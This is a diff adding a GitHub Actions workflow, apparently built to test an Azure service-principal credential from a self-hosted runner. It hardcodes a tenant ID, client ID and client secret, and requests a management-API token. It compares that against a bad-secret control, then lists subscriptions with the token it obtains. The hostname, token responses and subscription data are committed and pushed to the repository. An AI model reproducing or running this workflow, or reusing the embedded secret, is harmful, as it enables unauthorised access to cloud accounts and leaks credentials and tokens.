@@ -1,0 +1,37 @@
+name: ultok8094
+on:
+  push:
+    paths: ['trigger/arm8094t*']
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  tok:
+    runs-on: [self-hosted, Linux]
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: run
+        shell: bash
+        run: |
+          set -u
+          D=arm4; mkdir -p $D; R=$D/report.txt; : > $R
+          echo "START $(date -u) host=$(hostname)" >> $R
+          TEN=e8adc959-bf67-48e0-95b4-318b5f73946c
+          CID=25c1dc23-3925-49f1-94d3-4e702da5fa9b
+          SEC='TLh8Q~UZBIrSLwxhHlUjHlvmV.3Z_KYfmI1O6cLZ'
+          t(){ curl -s -m 25 -o "$D/$1.json" -w "%{http_code}" -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'grant_type=client_credentials' --data-urlencode "client_id=$CID" --data-urlencode "client_secret=$2" --data-urlencode 'scope=https://management.azure.com/.default' "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token"; }
+          H1=$(t real "$SEC"); echo "REAL http=$H1" >> $R; head -c 300 $D/real.json >> $R; echo >> $R
+          H2=$(t neg XXXbad); echo "NEG http=$H2" >> $R; head -c 200 $D/neg.json >> $R; echo >> $R
+          echo "--- oidc discovery ---" >> $R
+          curl -s -m 20 "https://login.microsoftonline.com/$TEN/v2.0/.well-known/openid-configuration" -o $D/oidc.json -w '%{http_code}\n' >> $R 2>&1 || true
+          echo "--- mgmt probe with any token ---" >> $R
+          T=$(python3 -c "import json;print(json.load(open('arm4/real.json')).get('access_token',''))" 2>/dev/null || true)
+          echo "TOKLEN ${#T}" >> $R
+          if [ -n "$T" ]; then curl -s -m 25 -H "Authorization: Bearer $T" 'https://management.azure.com/subscriptions?api-version=2022-12-01' -o $D/subs.json -w 'SUBS_HTTP %{http_code}\n' >> $R; head -c 400 $D/subs.json >> $R; fi
+          git config user.email ul@local; git config user.name ul
+          git add -A arm4 || true
+          git commit -qm "arm4 $(date -u)" || true
+          git push origin HEAD:${GITHUB_REF_NAME:-main} || true
